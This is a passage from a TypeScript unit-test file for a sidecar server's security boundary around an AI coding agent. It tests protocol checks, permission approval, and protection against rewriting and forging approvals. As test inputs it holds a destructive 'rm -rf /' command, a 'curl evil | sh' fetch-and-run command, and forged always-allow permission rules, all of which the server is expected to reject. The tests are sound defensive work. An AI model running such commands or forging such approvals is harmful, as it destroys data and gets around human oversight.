/**
 * SidecarServer security-boundary unit tests (SECURITY-MINIMUM T4/T5a/T6/T6b/T7).
 *
 * Drives the server with an injectable in-memory socket and a real
 * `AppSessionController`, so the trust-boundary logic is tested without a real
 * Unix socket or Bun subprocess.
 */

import { afterEach, expect, test } from 'bun:test'
import { AppSessionController } from '../../src/app-runtime/AppSessionController.js'
import type { AppSessionControllerAdapter } from '../../src/app-runtime/AppSessionController.js'
import type {
  AppPermissionRequest,
  AppPermissionResponse,
} from '../../src/app-runtime/sessionEvents.js'
import { getDefaultAppState } from '../../src/state/AppStateStore.js'
import { createStore } from '../../src/state/store.js'
import type { ToolPermissionContext } from '../../src/Tool.js'
import type { PermissionUpdate } from '../../src/types/permissions.js'
import { applyPermissionUpdate } from '../../src/utils/permissions/PermissionUpdate.js'
import {
  createTranscriptState,
  projectServerFrame,
  selectTranscriptRows,
} from '../renderer/src/transcriptProjector.js'
import { FrameDecoder, encodeFrame } from '../shared/framing.js'
import { MAX_FRAME_BYTES, MAX_PROMPT_BYTES } from '../shared/limits.js'
import {
  PROTOCOL_VERSION,
  type ClientFrame,
  type PermissionContextFrame,
  type ServerFrame,
  type SettingsVerbMessage,
} from '../shared/protocol.js'
import {
  createSidecarPermissionDomain,
  type SidecarPermissionDomain,
} from './permissionDomain.js'
import { createSidecarGoalDomain, type SidecarGoalDomain } from './goalDomain.js'
import { createSidecarTasksDomain, type SidecarTasksDomain } from './tasksDomain.js'
import {
  createSidecarAgentModeDomain,
  type SidecarAgentModeDomain,
} from './agentModeDomain.js'
import { createTaskStateBase } from '../../src/Task.js'
import type { LocalShellTaskState } from '../../src/tasks/LocalShellTask/guards.js'
import {
  createSidecarAccountsDomain,
  type AccountsCommandExecutor,
  type SidecarAccountsDomain,
} from './accountsDomain.js'
import {
  resetCodexAccountPoolForTest,
  seedCodexAccountPoolForTest,
  type PoolAccount,
} from '../../src/services/api/codexAccountPool.js'
import {
  createSidecarRemoteSettingsDomain,
  type RemoteSettingsCommandExecutor,
  type SidecarRemoteSettingsDomain,
} from './remoteSettingsDomain.js'
import { SidecarServer, type SidecarSocketLike } from './sidecarServer.js'
import { buildProbeToolUseMessage } from './probeAdapter.js'
import type {
  SidecarWorkspaceTrustDomain,
  WorkspaceTrustAcceptResult,
} from './workspaceTrustDomain.js'
import type { SidecarDiagnosticsDomain } from './diagnosticsDomain.js'
import {
  createSidecarExtensionsDomain,
  type SidecarExtensionsDomain,
} from './extensionsDomain.js'
import type { SidecarSettingsDomain } from './settingsDomain.js'
import { scanForSecrets } from '../shared/secretGuard.js'

const SESSION = 'test-session'
const ENGINE_SESSION = 'engine-test-session'

/** In-memory socket that decodes what the server writes back to it. */
function makeSocket() {
  const decoder = new FrameDecoder(MAX_FRAME_BYTES)
  const received: ServerFrame[] = []
  const socket: SidecarSocketLike = {
    write(data) {
      for (const result of decoder.push(Buffer.from(data))) {
        if (result.kind === 'frame') received.push(result.payload as ServerFrame)
      }
    },
    end() {},
  }
  return { socket, received }
}

function clientFrame(message: ClientFrame['message']): Buffer {
  return encodeFrame({
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
    message,
  } satisfies ClientFrame)
}

/** Adapter that yields the probe message (no permission). */
function probeAdapter(): AppSessionControllerAdapter {
  return {
    async *runTurn() {
      yield buildProbeToolUseMessage()
    },
  }
}

/** Adapter that raises exactly one permission request and awaits its response. */
function permissionAdapter(
  toolInput: Record<string, unknown>,
  onResolved: (r: AppPermissionResponse) => void,
  suggestions?: PermissionUpdate[],
): AppSessionControllerAdapter {
  return {
    async *runTurn({ onPermissionRequest }) {
      const request: AppPermissionRequest = {
        requestId: 'perm-1',
        request: {
          subtype: 'can_use_tool',
          tool_name: 'Bash',
          input: toolInput,
          tool_use_id: 'toolu_1',
          ...(suggestions ? { permission_suggestions: suggestions } : {}),
        },
      }
      const response = await onPermissionRequest(request)
      onResolved(response)
    },
  }
}

/** An engine-minted "always allow" suggestion, as the gate would produce it. */
function bashSuggestion(ruleContent: string): PermissionUpdate {
  return {
    type: 'addRules',
    rules: [{ toolName: 'Bash', ruleContent }],
    behavior: 'allow',
    destination: 'localSettings',
  }
}

let servers: SidecarServer[] = []
function makeServer(
  controller: AppSessionController,
  permissions?: SidecarPermissionDomain,
  goals?: SidecarGoalDomain,
  accounts?: SidecarAccountsDomain,
  workspaceTrust?: SidecarWorkspaceTrustDomain,
  diagnostics?: SidecarDiagnosticsDomain,
  remoteSettings?: SidecarRemoteSettingsDomain,
  tasks?: SidecarTasksDomain,
  extensions?: SidecarExtensionsDomain,
  agentMode?: SidecarAgentModeDomain,
  settings?: SidecarSettingsDomain,
): SidecarServer {
  const server = new SidecarServer({
    sessionId: SESSION,
    engineSessionId: ENGINE_SESSION,
    controller,
    ...(permissions ? { permissions } : {}),
    ...(goals ? { goals } : {}),
    ...(accounts ? { accounts } : {}),
    ...(workspaceTrust ? { workspaceTrust } : {}),
    ...(diagnostics ? { diagnostics } : {}),
    ...(remoteSettings ? { remoteSettings } : {}),
    ...(tasks ? { tasks } : {}),
    ...(extensions ? { extensions } : {}),
    ...(agentMode ? { agentMode } : {}),
    ...(settings ? { settings } : {}),
    log: () => {},
  })
  servers.push(server)
  return server
}

/** A fake settings domain — exercises the SERVER boundary (schema + allowlist +
 * dispatch + result frame + re-broadcast) without a real disk write (that round
 * trip is proven in settingsDomain.test.ts). */
function fakeSettingsDomain(
  runVerb: SidecarSettingsDomain['runVerb'] = () => ({
    ok: true,
    message: 'Updated.',
    changed: true,
  }),
): SidecarSettingsDomain {
  return {
    getSnapshot: () => ({
      layers: [],
      resolved: [],
      policyOrigin: null,
      editableValues: [],
    }),
    runVerb,
  }
}

/** Real engine app-state store seeded with an (optionally customized) context. */
function makePermissionStore(context?: Partial<ToolPermissionContext>) {
  const base = getDefaultAppState()
  return createStore({
    ...base,
    toolPermissionContext: { ...base.toolPermissionContext, ...context },
  })
}

afterEach(() => {
  for (const s of servers) s.close()
  servers = []
})

test('on attach, the server sends the canonical controller-derived app.ready payload', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  expect(received[0]).toEqual({
    kind: 'ready',
    protocolVersion: PROTOCOL_VERSION,
    sessionId: SESSION,
      engineSessionId: ENGINE_SESSION,
    payload: {
      type: 'app.ready',
      protocolVersion: PROTOCOL_VERSION,
      inputEnabled: true,
      activeTurn: false,
      abort: { status: 'idle' },
      goalSnapshot: null,
      pendingPermissionRequests: [],
    },
  })
})

test('rejects a frame with the wrong protocolVersion', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, encodeFrame({ protocolVersion: 999, sessionId: SESSION, message: { type: 'app.ping', nonce: 'x' } }))
  const err = received.find(f => f.kind === 'error')
  expect(err?.kind).toBe('error')
})

test('rejects a frame addressed to a different sessionId', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, encodeFrame({ protocolVersion: PROTOCOL_VERSION, sessionId: 'other', message: { type: 'app.ping', nonce: 'x' } }))
  const err = received.find(f => f.kind === 'error' && f.message.includes('sessionId'))
  expect(err).toBeDefined()
})

test('rejects an unallowlisted message type', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, encodeFrame({ protocolVersion: PROTOCOL_VERSION, sessionId: SESSION, message: { type: 'run-command', command: 'rm -rf /' } }))
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('app.ping is answered with a pong', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, clientFrame({ type: 'app.ping', nonce: 'nonce-1' }))
  const pong = received.find(f => f.kind === 'pong')
  expect(pong?.kind).toBe('pong')
})

test('T7 — rejects a prompt over the length cap', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(conn, clientFrame({ type: 'app.submit', requestId: 'r1', prompt: 'x'.repeat(MAX_PROMPT_BYTES + 1) }))
  expect(received.some(f => f.kind === 'error' && f.code === 'bad_request')).toBe(true)
})

test('app.submit emits the live user event before the assistant and the projector renders it once', async () => {
  let controllerUuid: string | undefined
  let controllerPrompt: unknown
  const controller = new AppSessionController({
    async *runTurn({ prompt, options }) {
      controllerPrompt = prompt
      controllerUuid = options?.uuid
      yield {
        type: 'assistant',
        message: {
          id: 'msg-live-assistant',
          role: 'assistant',
          content: [{ type: 'text', text: 'assistant response' }],
        },
        parent_tool_use_id: null,
        session_id: ENGINE_SESSION,
        uuid: '00000000-0000-4000-8000-00000000a001',
      } as never
    },
  })
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r-live-user',
      prompt: 'hello desktop',
    }),
  )
  await waitFor(() => received.filter(f => f.kind === 'event').length >= 2)

  const events = received.filter(
    (frame): frame is Extract<ServerFrame, { kind: 'event' }> =>
      frame.kind === 'event',
  )
  const firstEvent = events[0]!.event
  const secondEvent = events[1]!.event
  expect(firstEvent.type).toBe('message')
  expect(secondEvent.type).toBe('message')
  if (
    firstEvent.type !== 'message' ||
    secondEvent.type !== 'message' ||
    firstEvent.message.type !== 'user'
  ) {
    throw new Error('expected first live event to be the submitted user message')
  }
  expect(secondEvent.message.type).toBe('assistant')

  const userMessage = firstEvent.message
  expect(userMessage.message).toEqual({
    role: 'user',
    content: 'hello desktop',
  })
  expect(userMessage.session_id).toBe(ENGINE_SESSION)
  expect(userMessage.parent_tool_use_id).toBe(null)
  expect(typeof userMessage.uuid).toBe('string')
  expect(controllerPrompt).toBe('hello desktop')
  expect(controllerUuid).toBe(userMessage.uuid)

  let state = createTranscriptState()
  state = projectServerFrame(state, received[0]!)
  state = projectServerFrame(state, events[0]!)
  let rows = selectTranscriptRows(state, SESSION)
  expect(rows.filter(row => row.kind === 'user-text')).toEqual([
    expect.objectContaining({
      kind: 'user-text',
      content: 'hello desktop',
      frameId: userMessage.uuid,
    }),
  ])

  state = projectServerFrame(state, { ...events[0]!, replay: true })
  rows = selectTranscriptRows(state, SESSION)
  expect(rows.filter(row => row.kind === 'user-text')).toHaveLength(1)
})

test('T4 — rejects a submit whose goalSnapshot is not a valid ThreadGoal', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({
      type: 'app.submit',
      requestId: 'r1',
      prompt: 'hi',
      options: { goalSnapshot: { threadId: 42 /* wrong type */ } },
    }),
  )
  const err = received.find(f => f.kind === 'error' && f.message.includes('goalSnapshot'))
  expect(err).toBeDefined()
})

test('P4-10 — emits the live thread goal snapshot on attach and store change', () => {
  const store = makePermissionStore()
  store.setState(prev => ({
    ...prev,
    threadGoal: {
      threadId: 'thread-1',
      goalId: 'goal-1',
      objective: 'Ship goals panel',
      status: 'active',
      tokenBudget: 10_000,
      tokensUsed: 123,
      timeUsedSeconds: 7,
      createdAtMs: 1,
      updatedAtMs: 2,
    },
  }))
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    createSidecarGoalDomain(store),
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  const attachSnapshot = received.find(
    (frame): frame is Extract<ServerFrame, { kind: 'thread-goal.snapshot' }> =>
      frame.kind === 'thread-goal.snapshot',
  )
  expect(attachSnapshot?.kind).toBe('thread-goal.snapshot')
  expect(attachSnapshot?.goal?.objective).toBe('Ship goals panel')
  expect(attachSnapshot?.goal?.summary).toContain('Token budget: 10,000')

  store.setState(prev => ({
    ...prev,
    threadGoal: prev.threadGoal
      ? { ...prev.threadGoal, status: 'paused', updatedAtMs: 3 }
      : null,
  }))

  const latest = received
    .filter(
      (frame): frame is Extract<ServerFrame, { kind: 'thread-goal.snapshot' }> =>
        frame.kind === 'thread-goal.snapshot',
    )
    .at(-1)
  expect(latest?.kind).toBe('thread-goal.snapshot')
  expect(latest?.goal?.status).toBe('paused')
})

test('P4-12 — attach emits an extensions.snapshot after the goal snapshot, secretGuard-clean through send()', () => {
  const store = createStore(getDefaultAppState())
  const goals = createSidecarGoalDomain(store)
  // A snapshot carrying only config METADATA (the domain's secret posture) —
  // if a secret-KEYED field ever leaked in, send()'s secretGuard would drop the
  // whole frame, so its arrival is itself the proof.
  const extensions = createSidecarExtensionsDomain({
    mcp: [{ name: 'linear', transport: 'http', scope: 'user', url: 'https://mcp.linear/rpc' }],
    plugins: [],
    skills: [
      {
        name: 'deep-research',
        source: 'userSettings',
        context: 'inline',
        disableModelInvocation: false,
        userInvocable: true,
        description: 'research a topic',
      },
    ],
    hooks: [],
    notes: ['Read-only config snapshot.'],
  })
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    goals,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    extensions,
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  const readyIdx = received.findIndex(f => f.kind === 'ready')
  const goalIdx = received.findIndex(f => f.kind === 'thread-goal.snapshot')
  const extIdx = received.findIndex(f => f.kind === 'extensions.snapshot')
  // Attach order: ready → … → thread-goal.snapshot → … → extensions.snapshot.
  expect(readyIdx).toBe(0)
  expect(goalIdx).toBeGreaterThan(readyIdx)
  expect(extIdx).toBeGreaterThan(goalIdx)

  const snap = received.find(
    (frame): frame is Extract<ServerFrame, { kind: 'extensions.snapshot' }> =>
      frame.kind === 'extensions.snapshot',
  )
  expect(snap?.extensions.mcp?.[0]?.name).toBe('linear')
  expect(snap?.extensions.skills?.[0]?.name).toBe('deep-research')
  expect(snap && scanForSecrets(snap).ok).toBe(true)
})

test('P4-9 — emits the live tasks snapshot on attach and store change', () => {
  const store = makePermissionStore()
  const runningBash: LocalShellTaskState = {
    ...createTaskStateBase('b1', 'local_bash', 'echo hi'),
    type: 'local_bash',
    status: 'running',
    command: 'echo hi',
    completionStatusSentInAttachment: false,
    shellCommand: null,
    lastReportedTotalLines: 0,
    isBackgrounded: true,
  }
  store.setState(prev => ({ ...prev, tasks: { b1: runningBash } }))
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    createSidecarTasksDomain(store),
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  const attachSnapshot = received.find(
    (frame): frame is Extract<ServerFrame, { kind: 'tasks.snapshot' }> =>
      frame.kind === 'tasks.snapshot',
  )
  expect(attachSnapshot?.kind).toBe('tasks.snapshot')
  expect(attachSnapshot?.tasks.items).toHaveLength(1)
  expect(attachSnapshot?.tasks.items[0]).toMatchObject({
    id: 'b1',
    type: 'local_bash',
    status: 'running',
    label: 'echo hi',
  })

  store.setState(prev => ({
    ...prev,
    tasks: { b1: { ...runningBash, status: 'completed', isBackgrounded: true } },
  }))

  const latest = received
    .filter(
      (frame): frame is Extract<ServerFrame, { kind: 'tasks.snapshot' }> =>
        frame.kind === 'tasks.snapshot',
    )
    .at(-1)
  expect(latest?.kind).toBe('tasks.snapshot')
  // A completed local_bash task isn't the terminal-backgrounded-local_agent
  // carve-out, so it drops out of isVisibleBackgroundTask on the re-broadcast
  // — proving the store-driven re-emit carries fresh filtered state, not a
  // stale copy of the attach-time snapshot.
  expect(latest?.tasks.items).toHaveLength(0)
})

test('P4-8 — emits a joined agent-mode.snapshot on attach that is secretGuard-clean', async () => {
  const store = makePermissionStore()
  const blockedWorker = {
    ...createTaskStateBase('a1', 'local_agent', 'Wire the auth flow'),
    type: 'local_agent' as const,
    status: 'completed' as const,
    agentId: 'w-blocked',
    prompt: 'Wire the auth flow',
    agentType: 'implementor',
    agentName: 'Turing',
    retrieved: false,
    lastReportedToolCount: 0,
    lastReportedTokenCount: 0,
    isBackgrounded: true,
    pendingMessages: [],
    retain: false,
    diskLoaded: false,
    handoffStatus: 'blocked' as const,
    blockReason: 'Which auth strategy should I use?',
  }
  store.setState(prev => ({ ...prev, tasks: { a1: blockedWorker } }))
  const server = makeServer(
    new AppSessionController(probeAdapter()),
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    undefined,
    createSidecarAgentModeDomain(store),
  )
  const { socket, received } = makeSocket()

  server.addConnection(socket)

  // sendAgentModeSnapshot is async (the session plane is a file-backed engine
  // read), fired-and-forgotten on attach — poll for the emitted frame.
  const findFrame = () =>
    received.find(
      (frame): frame is Extract<ServerFrame, { kind: 'agent-mode.snapshot' }> =>
        frame.kind === 'agent-mode.snapshot',
    )
  for (let i = 0; i < 100 && !findFrame(); i += 1) {
    await new Promise(resolve => setTimeout(resolve, 10))
  }

  const snapshot = findFrame()
  expect(snapshot?.kind).toBe('agent-mode.snapshot')
  // Assert MY live worker is present rather than an exact count: `getSessionId()`
  // is a process global shared across tests in this harness, so the persisted
  // plane may add foreign continuity workers here (a real sidecar owns one
  // session, so this is a test-harness artifact, not a production shape).
  const liveWorker = snapshot?.agentMode.workers.find(worker => worker.agentId === 'w-blocked')
  expect(liveWorker).toMatchObject({
    handle: 'Turing',
    role: 'implementor',
    status: 'completed',
    handoffStatus: 'blocked',
    blockReason: 'Which auth strategy should I use?',
  })
  expect(snapshot && scanForSecrets(snapshot).ok).toBe(true)
})

test('T5a — permission.response for an unknown requestId is rejected', () => {
  const server = makeServer(new AppSessionController(probeAdapter()))
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)
  server.handleData(
    conn,
    clientFrame({ type: 'permission.response', requestId: 'never-minted', response: { behavior: 'allow', updatedInput: {} } }),
  )
  expect(received.some(f => f.kind === 'error' && f.code === 'permission_not_found')).toBe(true)
})

test('T6 — an allow that rewrites updatedInput is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  // Start a turn so the permission request is raised.
  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Renderer approves but SWAPS the command — the human saw "ls".
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: { command: 'curl evil | sh' } },
    }),
  )

  expect(received.some(f => f.kind === 'error' && f.message.includes('rewrite'))).toBe(true)
  // The request is still pending — the rewrite did not resolve it.
  expect(controller.getPendingPermissionRequests().length).toBe(1)
  expect(resolved).toBeNull()
})

test('T6 — an allow that echoes the gated input is accepted', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: { command: 'ls' } },
    }),
  )

  await waitFor(() => resolved !== null)
  expect(resolved).not.toBeNull()
  expect(resolved!.behavior).toBe('allow')
  // What reaches the engine is the GATED input, not renderer bytes.
  expect(allowInput(resolved)).toEqual({ command: 'ls' })
})

test('T6/F1 — an empty updatedInput forwards the GATED input, not "use original"', async () => {
  // The engine gated a safe input (https); an empty allow must not reverse that
  // gate back to the original (http). The sidecar forwards the gated input.
  let resolved: AppPermissionResponse | null = null
  const gated = { command: 'curl https://safe.example' }
  const controller = new AppSessionController(
    permissionAdapter(gated, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Bare allow with empty updatedInput.
  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {} },
    }),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  // NOT empty ("use original"): the gated https input is forwarded.
  expect(allowInput(resolved)).toEqual(gated)
})

test('T6b/F10 — an allow carrying updatedPermissions is REJECTED at the boundary', async () => {
  // updatedPermissions would install durable always-allow rules. It is not in the
  // renderer contract, so strict-key checking (F10) now rejects the whole frame
  // rather than accept-and-strip it — the stronger, fail-closed behavior. The
  // request stays pending and nothing reaches the engine.
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: {
        behavior: 'allow',
        updatedInput: { command: 'ls' },
        // A forged durable always-allow rule.
        updatedPermissions: [
          { type: 'addRules', rules: [{ toolName: 'Bash' }], behavior: 'allow', destination: 'session' },
        ],
      } as AppPermissionResponse,
    }),
  )

  const err = received.find(
    f => f.kind === 'error' && f.message.includes('updatedPermissions'),
  )
  expect(err).toBeDefined()
  // Not resolved: the forged frame never reached the engine.
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('T6b — sanitizePermissionResponse still strips updatedPermissions (defense-in-depth backstop)', async () => {
  // Even though F10 rejects such a frame at the boundary, the sanitizer remains a
  // backstop: if updatedPermissions ever reaches it, it is dropped before the
  // engine. Exercise the sanitizer directly (bypassing the strict-key layer).
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  // Call the internal sanitizer path via respondToPermissionRequest with the
  // sidecar's sanitize step applied — simulate a bypass by invoking the private
  // method through a cast.
  const sanitize = (
    server as unknown as {
      sanitizePermissionResponse: (
        conn: unknown,
        id: string,
        request: unknown,
        response: AppPermissionResponse,
      ) => AppPermissionResponse | null
    }
  ).sanitizePermissionResponse.bind(server)
  const pending = controller.getPendingPermissionRequests()[0]
  const sanitized = sanitize(
    { socket },
    'perm-1',
    pending!.request,
    {
      behavior: 'allow',
      updatedInput: { command: 'ls' },
      updatedPermissions: [
        { type: 'addRules', rules: [{ toolName: 'Bash' }], behavior: 'allow', destination: 'session' },
      ],
    } as AppPermissionResponse,
  )
  expect(sanitized).not.toBeNull()
  expect((sanitized as unknown as Record<string, unknown>).updatedPermissions).toBeUndefined()
  void resolved // unused; sanitizer path does not resolve the turn
})

test('C1 — allow + applySuggestions attaches the ENGINE-minted suggestion as updatedPermissions', async () => {
  // "Always allow": the renderer SELECTS (by index) among the suggestions the
  // engine minted on this request; the sidecar re-attaches the engine's own
  // update objects. The renderer never authors rule content (T6b intent).
  let resolved: AppPermissionResponse | null = null
  const suggestion = bashSuggestion('npm test:*')
  const controller = new AppSessionController(
    permissionAdapter({ command: 'npm test' }, r => {
      resolved = r
    }, [suggestion]),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)
  const engineSuggestions =
    controller.getPendingPermissionRequests()[0]!.request.permission_suggestions

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  const attached = (resolved as unknown as { updatedPermissions?: PermissionUpdate[] })
    .updatedPermissions
  // Deep-equal to the engine's own suggestion object…
  expect(attached).toEqual([suggestion])
  // …but CLONED, never aliasing the pending request's objects.
  expect(attached![0]).not.toBe(engineSuggestions![0])
  // The gated input is still what reaches the engine (T6 unchanged).
  expect(allowInput(resolved)).toEqual({ command: 'npm test' })
})

test('C1 — an empty applySuggestions is a plain allow-once (nothing attached)', async () => {
  // TUI parity: allow-once sends [] (BashPermissionRequest.tsx:346).
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*')]),
  )
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [] },
    } as never),
  )

  await waitFor(() => resolved !== null)
  expect(resolved!.behavior).toBe('allow')
  expect(
    (resolved as unknown as { updatedPermissions?: unknown }).updatedPermissions,
  ).toBeUndefined()
})

test('C1 — an out-of-range index is rejected fail-closed (request stays pending)', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*')]),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [1] },
    } as never),
  )

  const err = received.find(
    f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('applySuggestions'),
  )
  expect(err).toBeDefined()
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — a selection against a request that minted NO suggestions is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'allow', updatedInput: {}, applySuggestions: [0] },
    } as never),
  )

  const err = received.find(
    f => f.kind === 'error' && f.message.includes('no permission_suggestions'),
  )
  expect(err).toBeDefined()
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — non-integer, duplicate, and oversize selections are rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*'), bashSuggestion('pwd')]),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  const sendSelection = (applySuggestions: unknown) => {
    server.handleData(
      conn,
      clientFrame({
        type: 'permission.response',
        requestId: 'perm-1',
        response: { behavior: 'allow', updatedInput: {}, applySuggestions },
      } as never),
    )
  }

  sendSelection([0.5]) // non-integer
  sendSelection(['0']) // non-number
  sendSelection([-1]) // negative
  sendSelection([0, 0]) // duplicate
  sendSelection(Array.from({ length: 17 }, () => 0)) // over MAX_SUGGESTION_SELECTIONS
  sendSelection({ 0: 0 }) // non-array

  const errors = received.filter(
    f => f.kind === 'error' && f.code === 'bad_request' && f.message.includes('applySuggestions'),
  )
  expect(errors.length).toBe(6)
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — applySuggestions on a deny is rejected', async () => {
  let resolved: AppPermissionResponse | null = null
  const controller = new AppSessionController(
    permissionAdapter({ command: 'ls' }, r => {
      resolved = r
    }, [bashSuggestion('ls:*')]),
  )
  const server = makeServer(controller)
  const { socket, received } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 1)

  server.handleData(
    conn,
    clientFrame({
      type: 'permission.response',
      requestId: 'perm-1',
      response: { behavior: 'deny', message: 'no', applySuggestions: [0] },
    } as never),
  )

  const err = received.find(
    f => f.kind === 'error' && f.message.includes('only valid on an allow'),
  )
  expect(err).toBeDefined()
  expect(resolved).toBeNull()
  expect(controller.getPendingPermissionRequests().length).toBe(1)
})

test('C1 — a selection resolves against ITS OWN request, not another pending one', async () => {
  // Two concurrent pendings with different engine suggestions: answering B with
  // index 0 must attach B's suggestion and leave A untouched (T5a discipline
  // extended to the selection).
  const resolvedById = new Map<string, AppPermissionResponse>()
  const suggestionA = bashSuggestion('aaa:*')
  const suggestionB = bashSuggestion('bbb:*')
  const controller = new AppSessionController({
    async *runTurn({ onPermissionRequest }) {
      await Promise.all([
        onPermissionRequest({
          requestId: 'perm-A',
          request: {
            subtype: 'can_use_tool',
            tool_name: 'Bash',
            input: { command: 'aaa' },
            tool_use_id: 'toolu_A',
            permission_suggestions: [suggestionA],
          },
        }).then(r => resolvedById.set('perm-A', r)),
        onPermissionRequest({
          requestId: 'perm-B',
          request: {
            subtype: 'can_use_tool',
            tool_name: 'Bash',
            input: { command: 'bbb' },
            tool_use_id: 'toolu_B',
            permission_suggestions: [suggestionB],
          },
        }).then(r => resolvedById.set('perm-B', r)),
      ])
    },
  })
  const server = makeServer(controller)
  const { socket } = makeSocket()
  const conn = server.addConnection(socket)

  void controller.submit('go')
  await waitFor(() => controller.getPendingPermissionRequests().length === 2)

  server.handleData(
    conn,
